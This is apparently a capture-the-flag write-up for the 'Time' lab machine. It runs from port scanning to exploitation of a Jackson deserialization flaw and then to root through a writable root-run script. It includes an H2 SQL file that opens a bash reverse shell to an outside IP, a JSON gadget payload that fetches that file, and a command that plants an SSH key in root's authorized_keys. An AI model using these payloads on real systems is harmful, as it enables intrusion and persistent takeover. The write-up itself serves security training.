Time is a Linux based machine that was active since October 24th of 2020 to April 4th of 2021, on this machine we will exploit a vulnerability on Java jackson to get SSRF and ultimate RCE, then we will see that a script that we own is ran by root every x seconds, so we add our ssh public key to root's authorized keys and access as root.

# [](#header-1)Enumeration

We start using masscan to find all the available ports and then use nmap to get more information about them.

```
masscan -e tun0 --rate=500 -p 0-65535 10.10.10.214
nmap -sC -sV -p 22,80, -Pn -o scan.txt 10.10.10.214

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are only two ports open, ssh and a webpage, let's check it.

The site says "Online JSON beautifier & validator", the validator function says "beta!" so let's put a random json text, `{"two":"two"}`, we get a message: `Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object`

# [](#header-1)Gaining Access

We see that the error is on fasterxml.jackson, after searching for a while we can find a [blog](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96) that explains some CVEs on jackson, and [here](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html) another one that explains how to exploit the vulnerability, so first we create a file called inject.sql with the next content:

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.205/54321 0>&1')
```

We start a http server on port 8000, then we send the next chain on the Validate function: `["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.205:8000/inject.sql'"}]`

With that we get a shell in the machine and get access to user.txt

# [](#header-1)Privilege Escalation

We upload pspy to the machine to see what is running in the machine, after a short time we see that "/usr/bin/timer_backup.sh" is being ran every x seconds by root.

We check that file, and we see that we own it, if we spawn a reverse shell it gets killed after a short time, so let's generate a ssh key, `ssh-keygen -C root@htb.com`, and make that file add our public key to the authorized keys of root, to do that we run `echo 'echo "<public key>" >> /root/.ssh/authorized_keys' >> /usr/bin/timer_backup.sh`, when the file is executed we can connect through ssh as root to the machine with the private key.
